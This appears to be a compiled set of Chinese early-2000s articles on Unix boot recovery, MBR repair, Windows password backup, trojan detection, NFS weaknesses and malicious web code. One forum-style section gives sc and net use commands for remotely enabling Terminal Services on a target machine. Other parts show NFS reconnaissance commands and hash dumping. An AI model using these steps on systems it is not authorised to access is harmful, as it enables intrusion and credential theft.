● 进入创建应急引导盘的界面： 
#mkdev fd 
● 根据提示制作boot和root盘，其中制作boot盘时一般选择与本机相同的内核。 
处理“No os”提示 
如果系统引导失败或显示“No os”信息，说明引导块中/etc/hd0boot和/etc/hd1boot或主引导块/etc/masterboot 被破坏了，需要进行恢复： 
● 插入boot 盘引导，当出现boot: 提示符时，键入命令： 
hd(40)unix 
● 进入单用户方式，并键入下列命令： 
#instbb hd /dev/hd0a 
#dparam -w 
其中，instbb把部分引导块写入硬盘; dparam 把主引导块代码写入硬盘的主引导块。对于某些硬盘，还需要按dparam 的描述标记硬盘划分情况。 
处理boot问题 
如果系统引导时，出现如下错误信息： 
boot not found 
cannot open 
stage 1 boot failure: error loading hd(40) /boot 
这表明系统中的/boot损坏或丢失了，可以按如下方法进行恢复： 
● 插入boot引导盘，重新引导机器。在boot: 提示下键入： 
fd(60) unix.Z root=hd(42) 
上述命令从软盘上引导系统，并从软盘上装入核心，安装根文件系统。 
● 在提示符下键入root口令，进入单用户模式。卸载/stand 文件系统 (boot和核心在该文件系统中): 
umount /stand 
由于/boot文件系统通常是以只读方式安装的，所以在替换boot文件之前，必须先把它卸下，再重新安装上。 
● 重新安装/stand文件系统： 
mount /stand 
● 安装引导盘： 
mount -r/dev/fd0 /mnt 
● 恢复/boot文件: 
cp /mnt/boot /stand 
该命令在硬盘上复制一个新的/boot文件。 
● 把引导盘从驱动器中取出之前，键入如下命令： 
mount /mnt 
重新启动系统即可。 
处理Unix文件问题 
如果在开始引导时，系统显示：unix not found,则表明系统文件被损坏或丢失了，该文件包含了系统核心的引导映像。Unix文件丢失后，可以从另外的核心文件（如unix.old或unix.safe）上引导系统，为此，只须在boot提示符下键入替代的核心文件名即可。 
如果在系统上没有另外的核心文件，就需要从应急盘引导系统，以便恢复系统unix文件。首先，在boot:提示下键入： 
fd(60) unix.Z root=hd(42)swap=hd(41) 
然后，在单用户模式下，键入命令： 
umount /stand 
mount /stand 
mount -r/dev/fd0 /mnt 
cp /mnt/unix.Z /stand 
处理不能进入多用户问题 
如果按<ctrl> +D键后，系统进入多用户方式失败，或在引导时显示如下信息，表明/etc/inittab文件丢失: 
init: cannot open /etc/inittab errno: 2 
文件/etc/inittab中包含init命令。如果文件inittab丢失了，就不能执行系统启动命令，系统也就不能进入多用户方式。所以，按<ctrl> +D键时，系统停留在单用户模式下，并显示上述出错信息。 
要恢复inittab文件，必须重建核心环境： 
● 进入系统维护模式，键入以下命令： 
#cd /etc/conf/cf.d 
#touch /etc/.new-unix 
#../bin/idmkenv 
● 在系统提示选择信息时，键入y并按<ctrl>键，然后键入命令： 
cat /etc/inittab 
● 如果系统提示有关不能打开该文件的信息，键入命令： 
ln -s/var/opt/K/SCO/unix/* /etc/inittab /etc/inittab 
● 再键入exit后，系统出现如下信息： 
Enter run level(0-6，s or S): 
键入2，系统即可以进入多用户方式。 
处理root文件问题 
如果root文件系统遭到破坏，可以通过以下步骤进行恢复： 
● 用应急boot软盘启动，并根据提示插入应急root盘。 
● 在root提示符下键入命令： 
fsck /dev/hd0root 
如果fsck检查无误，那么使用haltsys关闭系统，并且从硬盘启动即可；如果fsck检查有误，那么继续进行以下设置： 
● 重新配置系统硬盘： 
#mkdev hd 
用户可以运行所有的初始化硬盘的应用程序对硬盘重新进行配置。 
● 当系统提示：making filesystems后，系统将返回到root提示符下，键入如下命令整理硬盘上的root文件系统： 
#fsck /dev/hd0root 
● 安装硬盘上的root 文件系统： 
#mount /dev/hd0root /mnt 
● 恢复硬盘上的root文件系统的备份： 
cd /mnt 
cpio -ivmkBud -I/dev/xxx 
其中，xxx表示磁带驱动器设备名。对于1/4英寸盒式磁带驱动器，xxx为rcto；对于mini盒式磁带驱动器，xxx为rctmini。另外，用户还可以根据实际情况，用cpio命令的其他选项完成此项工作。 
完成备份工作后，还要确认stand目录是否位于root文件的顶层，如果不是，使用如下命令行进行相应的调整: 
mkdir stand 
● 卸载和整理恢复的root文件系统: 
cd / 
umount /dev/hd0root 
fsck /dev/hd0root 
此时，系统将会提示一个警告信息，用户可以忽略这个警告信息： 
umount: warning: /dev/filesystem was not in mount table 
● 检查boot文件系统(/stand): 
fsck /dev/boot 
● 安装boot文件系统: 
mount /dev/boot /mnt 
● 使用如下命令卸载和整理恢复的boot文件系统: 
cd / 
umount /mnt 
fsck /dev/boot 
重新启动系统即可。 
处理emulator问题 
如果在开始引导时，系统显示：No floating is available ……信息，表明系统的/etc/emulator文件被损坏或丢失了，可以按如下步骤恢复： 
● 插入boot应急盘启动系统，在出现boot：提示时回车。 
● 清理根文件系统： 
#fsck -s/dev/hd0root 
● 用应急引导盘重新启动系统，键入命令： 
#/etc/mount /dev/hd0root /mnt 
#cp /etc/emulator /mnt/etc/emulator 
#/etc/umount /mnt 
重新启动系统即可。 
处理login文件丢失 
当系统提示“login:”，但输入后却不能登录时，显示“can誸 exec /bin/login: no such file”信息，表明login文件损坏或丢失。 
● 插入boot应急盘，重新启动系统，进入维护状态。 
● 恢复登录文件： 
# cpio idv -I/dev/rct0 bin/login 
菜鸟使用SC远程启动终端服务的误区
by wawa   
　大家都应该看过这篇的文章
------------------------------------------------------------------------------------------
C:\>net use \\xxx.xxx.xxx.xxx\ipc$ "password" /user:"name" 
第一步，检查对方是否真的禁用了Terminal server 
C:\>sc \\xxx.xxx.xxx.xxx qc termservice 
[SC] GetServiceConfig SUCCESS 
SERVICE_NAME: termservice 
TYPE : 10 WIN32_OWN_PROCESS 
START_TYPE : 4 DISABLED 
ERROR_CONTROL : 1 NORMAL 
BINARY_PATH_NAME : C:\WINNT\System32\termsrv.exe 
LOAD_ORDER_GROUP : 
TAG : 0 
DISPLAY_NAME : Terminal Services 
DEPENDENCIES : 
SERVICE_START_NAME : LocalSystem 
仔细看 START_TYPE一项，显示对方该服务的启动模式为“DISABLED”也就是“禁用”。 
第二步，更改对方终端服务的启动模式 
C:\>sc \\xxx.xxx.xxx.xxx config termservice start= auto 
[SC] ChangeServiceConfig SUCCESS 
好了，现在我们已经把对方终端服务的启动模式修改成自动了。 
第三步，再检查一便对方终端服务的启动模式（.abu.:呵呵，习惯问题） 
C:\>sc \\TEST qc termservice 
[SC] GetServiceConfig SUCCESS 
SERVICE_NAME: termservice 
TYPE : 10 WIN32_OWN_PROCESS 
START_TYPE : 2 AUTO_START 
ERROR_CONTROL : 1 NORMAL 
BINARY_PATH_NAME : C:\WINNT\System32\termsrv.exe 
LOAD_ORDER_GROUP : 
TAG : 0 
DISPLAY_NAME : Terminal Services 
DEPENDENCIES : 
SERVICE_START_NAME : LocalSystem 
仔细看 START_TYPE一项，显示对方该服务的启动模式为“AUTO_START”也就是“自动”。 
OK 
第四步，启动对方的终端服务 
C:\>sc \\xxx.xxx.xxx.xxx start termservice 
SERVICE_NAME: termservice 
TYPE : 10 WIN32_OWN_PROCESS 
STATE : 2 START_PENDING 
(NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN) 
WIN32_EXIT_CODE : 0 (0x0) 
SERVICE_EXIT_CODE : 0 (0x0) 
CHECKPOINT : 0x1 
WAIT_HINT : 0x7530 
C:\>sc \\xxx.xxx.xxx.xxx query termservice 
SERVICE_NAME: termservice 
TYPE : 10 WIN32_OWN_PROCESS 
STATE : 4 RUNNING 
(NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN) 
WIN32_EXIT_CODE : 0 (0x0) 
SERVICE_EXIT_CODE : 0 (0x0) 
CHECKPOINT : 0x0 
WAIT_HINT : 0x0 
到这里，对方的终端服务就被你启动了。命令行方式下哦。呵呵 
---------------------------------------------------------------------------
这是一篇很好的解决终端服务termservice在"管理工具">>>"服务"中被禁用的好办法. 
如果终端服务组件没有安装
还要以"用Sc看到status是stopped的，使用sc将其启动变为auto"
就认为服务已经启动,那就错了!
新手会经常出现这个问题,我也经常在论坛看到此类帖子. 
如果没有安装服务组件,一样可以
sc config termservice start= auto
sc start termservice 
再看:
sc query termservice
SERVICE_NAME: termservice
TYPE : 10 WIN32_OWN_PROCESS
STATE : 2 START_PENDING       //没有runing,而是正在启动状态(未决)
(NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
WIN32_EXIT_CODE : 0 (0x0)
SERVICE_EXIT_CODE : 0 (0x0)
CHECKPOINT : 0x0
WAIT_HINT : 0x7d0 
在这时,服务是不可能真正启动的,因为终端服务组件并没有安装,虽然你用SC看到了服务状态,但你是肯定连不上的.
这样而且会在重起时出现服务错误,不信,你可以在他重起后,远程连到计算机管理,查看"事件查看器"===>"系统",你会发现 "terminal services 服务在启动时暂停"的描述 
所以,在使用SC远程启动服务时,要首先判断终端服务组件已经安装,而且确实是在"服务"中被禁用的,才可以成功运用此方法.
硬盘分区的恢复与备份
　硬盘是很多病毒的攻击对象。而且，一些意外的情况，比如突然断电等也能使硬盘的主引导分区数据丢失。分区一损坏，系统则立即瘫痪，动弹不得。所以关于分区的恢复与备份的技巧，是必须要掌握的技巧：
　　首先，一旦发生计算机无法检测到硬盘的情况，排除了硬件上的问题，我们就应该开始检测分区。一般来说，如果主引导区或者引导程序和分区表中的一个被破坏的话，都会出现硬盘丢失的情况。我们一个个做一番检查：
　　分区表的检查与修复
　　若计算机不能从硬盘启动，则我们可以通过软盘启动后，试着访问硬盘。如果硬盘可以被访问，则说明只是操作系统被破坏，可以用重新安装操作系统的方法来恢复，或者直接把别的计算机上的硬盘拿过来进行数据对拷；如果不能访问硬盘，则可能是主引导区或者可引导分区的引导区被破坏了。这时候，我们可以应用DEBUG或者诸如NortonDiskEditor等工具软件查看硬盘的主引导区是否正常。下面我们给出一个利用DEBUG访问主引导区的实例：（其中XXXX表示内存段地址，由于计算机的BIOS、操作系统及配置文件等的不同，从而导致XXXX地址段不同）。
　　a：＼＞DEBUG
　　－a汇编指令
　　XXXX：0100movax，201读取一个扇区
　　XXXX：0103movbx，600读至当前段
　　0600处XXXX：0106movcx，1柱面号＝1
　　XXXX：0109movdx，80磁头号＝0，驱动器号＝80
　　XXXX：010Cint13磁盘读写中断
　　XXXX：010Eint3断点中断
　　XXXX：010F－g执行上述指令
　　－d600显示主引导区内容
　　如果主引导区没有问题的话，我们就要再检查一下引导程序和分区表是否正常。如果发现程序异常（通过和正常的程序对比），则说明引导程序有可能被干扰。恢复引导程序的方法比较多，我们先来介绍手工恢复的方法：首先，你必须从一台正常工作的计算机中获取主引导区存放的文件mboot．dat，用软盘启动后，运行DEBUG程序并输入下列命令：
　　－nmboot．dat读文件mboot．dat
　　－1800读至当前段0800处
　　－m7be1409be将原分区表复制到正常的主引导区
　　XXXX：0100movax，301将0800处数据写回住引导扇区
　　XXXX：0103movbx，800XXXX：0106
　　－rip修改当前指令指针
　　IP：010E0100当前指令指针指向0100
　　－g执行
　　记住，一定要是完全相同的硬盘分区表，如果无法得到，可以使用DISKEDIT之类的软件，手工填写分区表进行恢复。
利用工具软件恢复引导分区
　　KV3000虽然是个防杀病毒软件，它也具有非常强的分区修复的能力。更让人雀跃的是，它还能进行系统分区的备份。这样，即使硬盘上的两个分区表全部损坏，我们还能用备份在软盘上的分区表进行修复。先来谈谈KV3000的备份。输入如下格式命令（KV3000／B或者kv3000／HDPT．DAT），将自动向A盘备份一个无病毒的硬盘主引导信息档案，其名称分别为HDPT．DAT和HFª睟OOT．DAT。当硬盘主引导信息被病毒破坏或主引导记录损坏时，你只要输入“KV3000／HDPT．DAT”就能将备份的内容恢复到硬盘中（备份和所要恢复的硬盘必须是同一块）。
　　如果你没有进行备份，KV3000还允许你修复硬盘的主引导信息，再执行KV3000，按下F6键，就可查看已经不能引导的硬盘隐含扇区，即可查看硬盘0面0柱1扇区主引导信息是否正常。如果在硬盘的0面0柱1扇区没有找到关键代码，那么硬盘本身将不能自引导，即使软盘引导后也不能进入硬盘。可在硬盘的隐含扇区内查找，找到后，系统会在表中出现闪动的红色“80”和“55AA”，并响一声来提醒你，下行会出现一行提示，“F9＝SAVETOSIDE0CYLINDER0SECTOR1！！！”。这时，按一下：“F9”键，就可将刚找到的原硬盘主引导信息覆盖到硬盘0面0柱1扇区，然后，计算机会重新引导硬盘，恢复硬盘的启动性能，在软盘引导后也能进入硬盘。
　　另外，如果由于病毒的破坏或操作上的失误，致使硬盘主引导记录和分区表损坏，硬盘不能引导或软盘引导也不能进入硬盘时，如果先用KV3000／B的命令在软盘上备份过主引导记录，这时可用KV3000／HDPT．DAT的命令再恢复硬盘主引导记录，如果先前没有备份过硬盘主引导信息，这时，只有用KV3000快速重建硬盘分区表的功能试一试。
软盘引导系统后，执行KV3000，主菜单出来后，按下F10键，就可对系统的有关参数和硬盘分区表快速测试，如果硬盘分区表不正常，KV3000会先将坏分区表保存到软盘上，再自动重建硬盘分区表，使硬盘起死回生。　　如果硬盘只有一个分区，而且文件分配表（FAT表），文件根目录（ROOT表）已被病毒严重破坏，那么，即使恢复了C盘分区表，也不能使C盘引导，需手工配合其他专用修复软件来恢复数据。但如果还有D、E等扩展分区，一般情况下，KV3000能找回后面没有被破坏掉的分区，重建一个新的硬盘主分区表，然后，再用DOS系统软盘引导计算机后，就可进入硬盘的D、E等分区。
重新安装 Windows 2000 后密码的恢复 
在Windows 2K 的日常管理中，我们无可避免地会碰到重新安装Windows 2K 的时候，资料的备份可以有很多方式实现，用户的属性备份也可以通过 ADSI 脚本或者通过 Addusers 工具（见Windows 2000 Resource Kits）来实现，但是用户的密码，我们可能必须重新设置了，对于一台拥有上百用户的服务器来说，用户的抱怨将会给管理员带来很大的压力和麻烦，现在给大家推荐一款不错的好东东--CopyPwd，用来备份用户的密码。
下载地址：
http://www.sometips.com/soft/copypwd.zip
（老外还是比较牛，一个多礼拜就完成了这个玩艺的开发，内附源代码）
下面介绍一下用来作实验的两台机器，一台是中文Windows 2000 Server（取名为S1），一台是中文Windows 2000 Pro（取名为S2），两台皆为StandAlone的机器。当然，这个工具也能用在NT4的StandAlone和域结构中，但是偶没有进行过测试。
闲话少说，开始实验：我们首先在S1上进行如下的操作：
D:\copypwd>net user adam ILoveAdam! /add
命令成功完成。
//创建用户adam，密码为 ILoveAdam! 
D:\copypwd>copypwd.exe dump > copypwd.txt
//将S1所有用户密码dump出来，不要修改copypwd.txt这个文件名，btw，如果这个操作在你的机器上无法完成的话，你可以离开本页继续到浩瀚无垠的Internet上继续遨游了，Forgot me，就像忘记清晨开放在你窗前的那朵小花...  
D:\copypwd>notepad copypwd.txt
//修改copypwd.txt文件，将与adam无关的行删除并存盘，由于我们在测试的时候只对一个用户进行测试，所以只保留了adam一行，如果你需要备份多个用户，你可以保留与那些用户相关的lines
我们将操作转移到 S2 上，首先我们可以测试一下 S2 上是否可以执行 copypwd dump，如果不行，你就自认倒霉吧，至于为什么有的机器能执行有的机器不能执行不在本文讨论范围之列，大家可以与 PWDump的作者－Jeremy Allison <jra@cygnus.com> 联系。
C:\>net user adam ILoveAdam! /add
命令成功完成。
//创建一个 adam 帐号，在这里我们使用的net user创建的该帐号，当然，我们也可以用 AddUsers来创建，这样我们能保留更多与用户相关的咨询，AddUser 具体使用可以参见Windows 2000 Resources Kits的手册。
C:\>copy \\192.168.X.X\copypwd\copypwd.txt .
已复制 1 个文件。
//将备份的copypwd.txt文件复制到 S2
C:\>copypwd.exe set
Set password for user adam
//密码恢复成功，不管你在 S2 上创建的密码是什么，现在的密码都是 ILoveAdam! 
需要值得注意的一点，在我们实施完该操作后，该用户的 User must change password at next logon 开关被Enable了，所以在测试的时候会碰到一些问题，因此我们必须在用户管理器中Uncheck这个选项，当然，我们也可以通过命令行的方式来实现，所以在这里推荐一个Resource Kits里面的一个工具 cusrmgr，首先看看它的帮助：
CUsrMgr Ver 1.0 Jan98 by G.Zanzen (c) MCS Central Europe
Sets a random password to a user
usage: -u UserName [-m \\MachineName] \\ default LocalMachine
Resetting Password Function
-p Set to a random password
-P xxx Sets password to xxx
User Functions
-r xxx Renames user to xxx
-d xxx deletes user xxx
Group Functions
-rlg xxx yyy Renames local group xxx to yyy
-rgg xxx yyy Renames global group xxx to yyy
-alg xxx Add user (-u UserName) to local group xxx
-agg xxx Add user (-u UserName) to global group xxx
-dlg xxx deletes user (-u UserName) from local group xxx
-dgg xxx deletes user (-u UserName) from global group xxx
SetProperties Functions
-c xxx sets Comment to xxx
-f xxx sets Full Name to xxx
-U xxx sets UserProfile to xxx
-n xxx sets LogonScript to xxx
-h xxx sets HomeDir to xxx 
-H x sets HomeDirDrive to x 
+s xxxx sets property xxxx
-s xxxx resets property xxxx
where xxxx can be any of the following properties:
MustChangePassword
CanNotChangePassword
PasswordNeverExpires
AccountDisabled
AccountLockout
RASUser
【老规矩，字数不够帮助凑】
我们激活用户的语法是：
D:\copypwd>cusrmgr -u adam -s MustChangePassword
这样，我们的操作就完成了... 
常用攻击个人电脑手法
你在网络上冲浪，别人和你聊天，你发电子邮件，必须要有共同的协议，这个协议就是TCP/IP协议，任何网络软件的通讯都基于TCP/IP协议。如果把互联网比作公路网，电脑就是路边的房屋，房屋要有门你才可以进出，TCP/IP协议规定，电脑可以有256乘以256扇门，即从0到65535号“门”，TCP/IP协议把它叫作“端口”。当你发电子邮件的时候，E-mail软件把信件送到了邮件服务器的25号端口，当你收信的时候，E-mail软件是从邮件服务器的110号端口这扇门进去取信的，你现在看到的我写的东西，是进入服务器的80端口。新安装好的个人电脑打开的端口号是139端口，你上网的时候，就是通过这个端口与外界联系的。黑客不是神仙，他也是--- 
通过端口进入你的电脑 
黑客是怎么样进入你的电脑的呢？当然也是基于TCP/IP协议通过某个端口进入你的个人电脑的。如果你的电脑设置了共享目录，那么黑客就可以通过139端口进入你的电脑，注意！WINDOWS有个缺陷，就算你的共享目录设置了多少长的密码，几秒钟时间就可以进入你的电脑，所以，你最好不要设置共享目录，不允许别人浏览你的电脑上的资料。除了139端口以外，如果没有别的端口是开放的，黑客就不能入侵你的个人电脑。那么黑客是怎么样才会进到你的电脑中来的呢？答案是通过特洛伊木马进入你的电脑。如果你不小心运行了特洛伊木马，你的电脑的某个端口就会开放，黑客就通过这个端口进入你的电脑。举个例子，有一种典型的木马软件，叫做netspy.exe。如果你不小心运行了netspy.exe，那么它就会告诉WINDOWS，以后每次开电脑的时候都要运行它，然后，netspy.exe又在你的电脑上开了一扇“门”，“门”的编号是7306端口，如果黑客知道你的7306端口是开放的话，就可以用软件偷偷进入到你的电脑中来了。特洛伊木马本身就是为了入侵个人电脑而做的，藏在电脑中和工作的时候是很隐蔽的，它的运行和黑客的入侵，不会在电脑的屏幕上显示出任何痕迹。WINDOWS本身没有监视网络的软件，所以不借助软件，是不知道特洛伊木马的存在和黑客的入侵。接下来，奇奇就让你利用软件---- 
如何发现自己电脑中的木马 
奇奇再以netspy.exe为例，现在知道netspy.exe打开了电脑的7306端口，要想知道自己的电脑是不是中netspy.exe，只要敲敲7306这扇“门”就可以了。你先打开C:\WINDOWS\WINIPCFG.EXE程序，找到自己的IP地址（比如你的IP地址是10.10.10.10），然后打开浏览器，在浏览器的地址栏中输入 http://10.10.10.10:7306/，如果浏览器告诉你连接不上，说明你的电脑的7306端口没有开放，如果浏览器能连接上，并且在浏览器中跳出一排英文字，说的netspy.exe的版本，那么你的电脑中了netspy.exe木马了。这是最简单最直接的办法，但是需要你知道各种木马所开放的端口，奇奇已知下列端口是木马开放的：7306、7307、7308、12345、12345、12346、31337、6680、8111、9910。但是就算你熟悉了所有已知木马端口，也还是不能完全防范这些木马的，我们需要---- 
进一步查找木马 
奇奇曾经做了一个试验：我知道netspy.exe开放的是7306端口，于是我用工具把它的端口修改了，经过修改的木马开放的是7777端口了，你现在再用老办法是找不到netspy.exe木马了。于是我们可以用扫描自己的电脑的办法看看电脑有多少端口开放着，并且再分析这些开放的端口。 
前面讲了电脑的端口是从0到65535为止，其中139端口是正常的，首先找个端口扫描器，奇奇推荐“代理猎手”，你上网以后，找到自己的IP地址，现在请关闭正在运行的网络软件，因为可能开放的端口会被误认为是木马的端口，然后让代理猎手对0到65535端口扫描，如果除了139端口以外还有其他的端口开放，那么很可能是木马造成的。 
排除了139端口以外的端口，你可以进一步分析了，用浏览器进入这个端口看看，它会做出什么样的反映，你可以根据情况再判断了。 
扫描这么多端口是不是很累，需要半个多小时傻等了，现在好了，我汉化了一个线程监视器，Tcpview.exe可以看电脑有什么端口是开放的，除了139端口以外，还有别的端口开放，你就可以分析了，如果判定自己的电脑中了木马，那么，你就得---- 
在硬盘上删除木马 
最简单的办法当然是用杀毒软件删除木马了，Netvrv病毒防护墙可以帮你删除netspy.exe和bo.exe木马，但是不能删除netbus木马。 
下面就netbus木马为例讲讲删除的经过。 
简单介绍一下netbus木马，netbus木马的客户端有两种，开放的都是12345端口，一种以Mring.exe为代表（472,576字节），一种以SysEdit.exe为代表（494,592字节）。 
Mring.exe一旦被运行以后，Mring.exe就告诉WINDOWS，每次启动就将它运行，WINDOWS将它放在了注册表中，你可以打开C:\WINDOWS\REGEDIT.EXE进入HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run找到Mring.exe然后删除这个健值，你再到WINDOWS中找到Mring.exe删除。注意了，Mring.exe可能会被黑客改变名字，字节长度也被改变了，但是在注册表中的位置不会改变，你可以到注册表的这个位置去找。 
另外，你可以找包含有“netbus”字符的可执行文件，再看字节的长度，我查过了，WINDOWS和其他的一些应用软件没有包含“netbus”字符的，被你找到的文件多半就是Mring.exe的变种。 
SysEdit.exe被运行以后，并不加到WINDOWS的注册表中，也不会自动挂到其他程序中，于是有人认为这是傻瓜木马，奇奇倒认为这是最最可恶、最最阴险的木马。别的木马被加到了注册表中，你就有痕迹可查了，就连专家们认为最最凶恶的BO木马也可以轻而易举地被我们从注册表中删除。 
而SysEdit.exe要是挂在其他的软件中，只要你不碰这个软件，SysEdit.exe也就不发作，一旦运行了被安装SysEdit.exe的程序，SysEdit.exe也同时启动了。奇奇在自己的电脑中做了这样一个实验，将SysEdit.exe和C:\WINDOWS\SYSTEM\Abcwin.exe捆绑起来，Abcwin.exe是智能ABC输入法，当我开启电脑到上网，只要没有打开智能ABC输入法打字聊天，SysEdit.exe也就没有被运行，你就不能进入我的12345端口，如果我什么时候想打字了，一旦启动智能ABC输入法（Abcwin.exe），那么捆绑在Abcwin.exe上的SysEdit.exe也同时被运行了，我的12345端口被打开，别人就可以黑到我的电脑中来了。同样道理，SysEdit.exe可以被捆绑到网络传呼机、信箱工具等网络工具上，甚至可以捆绑到拨号工具上，电脑中的几百的程序中，你知道会在什么地方发现它吗？所以我说这是最最阴险的木马，让人防不胜防。 
有的时候知道自己中了netbus木马，特别是SysEdit.exe，能发现12345端口被开放，并且可以用netbus客户端软件进入自己的电脑，却不知道木马在什么地方。这时候，你可以检视内存，请打开C:\WINDOWS\DRWATSON.EXE，然后对内存拍照，查看“高级视图”中的“任务”标签，“程序”栏中列出的就是正在运行的程序，要是发现可疑的程序，再看“路径”栏，找到这个程序，分析它，你就知道是不是木马了。SysEdit.exe虽然可以隐藏在其他的程序后面，但是在C:\WINDOWS\DRWATSON.EXE中还是暴露了。 
好了，来回顾一下，要知道自己的电脑中有没有木马，只要看看有没有可疑端口被开放，用代理猎手、Tcpview.exe都可以知道。要查找木马，一是可以到注册表的指定位置去找，二是可以查找包含相应的可执行程序，比如，被开放的端口是7306，就找包含“netspy”的可执行程序，三是检视内存，看有没有可以的程序在内存中。 
你的电脑上的木马，来源有两种，一种是你自己不小心，运行了包含有木马的程序，另一种情况是，“网友”送给你“好玩”的程序。所以，你以后要小心了，要弄清楚了是什么程序再运行，安装容易排除难呀。
NFS服务的安全问题
Unix系统的NFS服务相当于MS系统上的文件共享服务.也许有人认为这是一个不恰当的比喻,但二者在安全问题上有惊人的类似,正如NT/Windows机器上的安全问题很多来自共享资源一样,NFS服务的错误配置,也可以让你的系统被入侵者接管.NFS建立在RPC(远程过程调用)机制上,同样地,基于RPC机制上的NT的服务也不安全;针对MS共享资源的攻击是当前Internet上最流行的攻击NT方式,对NFS的攻击也对UNix平台机器的最常用手段. 
NFS的不安全性主要体现于以下4个方面: 
1、新手对NFS的访问控制机制难于做到得心应手,控制目标的精确性难以实现 
2、NFS没有真正的用户验证机制,而只有对RPC/Mount请求的过程验证机制 
3、较早的NFS可以使未授权用户获得有效的文件句柄 
4、在RPC远程调用中,一个SUID的程序就具有超级用户权限. 
我们分别从这几个方面加以论述: 
1、在大多数Unix系统的缺省的情况下,Export目录时,如果不指定只读,该目录为可写;NFS的访问控制文件很容易出现错误配置,很多情况下配置为可以被网上任何一台机器访问,远程用户可以用这条命令来查到是否有NFS的配置漏洞,这个命令是几乎所有的NFS攻击的必经步骤: 
# showmount -e www.xxx.com 
可能结果如下: 
/usr (everyone) 
/export/target1 -access=target2 
/export/target2 -access=target1 
可以把这个NFS server上的/usr目录mount成本地目录: 
# mount www.xxx.com:/usr /tmp 
这表明,/usr目录可以被任何一台机器mount,甚至可能有写的权限;而/export/target1目录指定了主机访问限制,必须是target2.xxx.com这个机器或者
target2这个Netgroup的成员才能mount.入侵者大多都先用这个命令来查询目标上的NFS漏洞,正如对NT的Netview命令一样.值得提醒的是,现在流行的入侵方式已经从以前的对确定目标的攻击方式转为不管对方是谁,只要有机可乘就入侵的方式.入侵者可能会写一个脚本或者一个程序,用来对一大段地址进行扫描,列出结果报告给自己.所以,正确的配置是非常重要的.在Internet上,NFS设置错误的机器比比皆是.这个配置一般存放于/etc/exports文件或/etc/dfs/dfstab中. 
2、来自客户端的NFS请求的用户认证,由用户的UID和所属组的GID组成,这种文件访问的安全验证对于没有开NFS的系统当然是安全的;但是在网上,其它机器的root完全有权在自己的机器上设置这样一个UID,而NFS服务器不管这个UID是不是自己机器上的,只要UID符合,就赋予这个用户对这个文件的操作权.比如,目录/home/frank只能由UID为501的用户打开读写,而这个目录可以被远程机器mount,那么,这台机器的root用户新增一个UID为501的用户,然后用这个用户登录并mount该目录,就可以获得相当于NFS server上的UID为501用户操作权限,从而读写/home/frank.要解决这个问题必须正确配置exports,限制客户的主机地址,明确设置rw=host的选项,ro(只读)的选项和access=host的选项. 
另外,还有一种UID欺骗,是关于16位UID和32位UID的问题.大多NFS服务接受的来自客户对NFS请求所发送的UID标志都是16位的(Solaris是一个例外),这是不安全的.在这种情况下,如果用一个32位UID,并把这个UID最左边的位置设置为0,那么,体现在NFS server上,解释为16位的UID,这个UID就相当于root;任何用户引用32位UID并且这个UID最左边的数字是0,那么就可以读/写属于root的任何文件.要解决这个问题,可以从Sun的正式站点获取#1095935 补丁. 
3、以前的文件句柄无须mount守护进程的帮助就可以构造,使客户直接可以和NFS通信.而现在的Unix系统大多进行了改进.但BSD系统还有问题.关于BSD文件句柄的问题涉BSD OS2.0,2.1,3.0;FreeBSD2.1.5~2.1.7,openBSD2.0和2.0以前.其它一些BSD也可能有类似的问题. 例如在4.4BSD中,与其它的UNix文件系统不同的是,一个文件的信息,除了创建时间、文件大小、连接个数和更新时间等信息外,还有一个st_gen信息,st_gen是一个4位的值,目的是使NFS文件句柄难于猜到.这个信息是stat(2)系统调用生成的.不幸的是,这个调用用到的一个函数vn_stat()有问题: 
... 
sb->st_gen = vap->va_gen; 
sb->st_blocks = vap->va_bytes / S_BLKSIZE; 
return (0); } 
上面这段程序码暴露了用来生成st_gen这个数的所有信息,利用这些信息,未授权用户可以得到文件的句柄.正确的程序应该只允许这些信息暴露给root: 
... 
sb->st_flags = vap->va_flags; 
if (suser(p->p_ucred, &p->p_acflag)) { 
sb->st_gen = 0; 
} else { 
sb->st_gen = vap->va_gen; 
} 
sb->st_blocks = vap->va_bytes / S_BLKSIZE; 
return (0); 
} 
这样,如果不是root,他只能得到0这个信息. 
4、最危险的错误是把含有SUID程序的目录export,并且该文件有执行权.SUID程序相当于超级用户本身. 
解决方案: 
1、和从NT中删除任何共享的解决方案一样,最好的解决方案是禁止NFS服务,或以AFS服务取而代之(Andrew File System). 
2、如果一定要开NFS,不要让一个单机可以既是client,也是server; 
3、export出的文件系统只设置为只读 
4、禁止那些有SUID特性的程序的执行 
5、不要export home 目录 
6、不要export可执行特性 
7、使用一些安全NFS实现方案(虽然未必真的很安全)
浏览网页也要留心的陷阱
随着计算机及网络应用的扩展，电脑信息安全所面临的危险和已造成的损失也在成倍地增长，特别是各种黑客的增多，一些个人用户也时常遭到不同手段的攻击，这不得不引起我们的重视。
对于个人用户来说，除了病毒和木马，网页中的隐形代码也开始严重地威胁着我们的安全，但大多数人却缺乏自我保护意识，对隐形代码的危害认识不够，甚至在自己不知情的情况下被别人窃取了重要资料。因为隐形代码具有比较大的隐蔽性，到目前为止，还没有什么病毒防火墙能很好地阻止隐形代码的攻击，大多数甚至根本就不能发现。所以我们更应该高度警惕网页代码中的隐形杀手。一般来说网页代码中的“隐形杀手”大致分为以下几类：
隐形杀手1 占用CPU
通过不断地消耗本机的系统资源，最终导致CPU占用率高达100%，使计算机不能再处理其他用户的进程。
“隐形杀手1”代码的典型恶作剧是通过javascript产生一个死循环。这类代码可以是在有恶意的网站中出现，也可以以邮件附件的形式发给你。现在大多数的邮件客户端程序都可以自动调用浏览器来打开HTM/HTML类型的文件。这样只要你一打开附件，屏幕上就会出现无数个新开的浏览器窗口。最后让你不得不重新启动计算机。
避恶方法 对于这类问题，只能是不要随便打开陌生人寄来的邮件的附件，特别是扩展名是.vbs、.htm、.doc、.exe的附件。
隐形杀手2 非法读取本地文件
这类代码典型的作法是在网页中通过对Activex、javascript和WebBrowser control的调用来读本地文件。
“隐形杀手2”的代码较之“隐形杀手1”的特点就是表现方式较隐蔽，一般的人不容易发现隐形代码正在读取自己硬盘上的文件。“隐形杀手2”还能利用浏览器自身漏洞来实现其杀招，如IE5.0的IFrame漏洞。很简单的几行代码就可以读取你本地硬盘上的任何IE可以打开的文件。
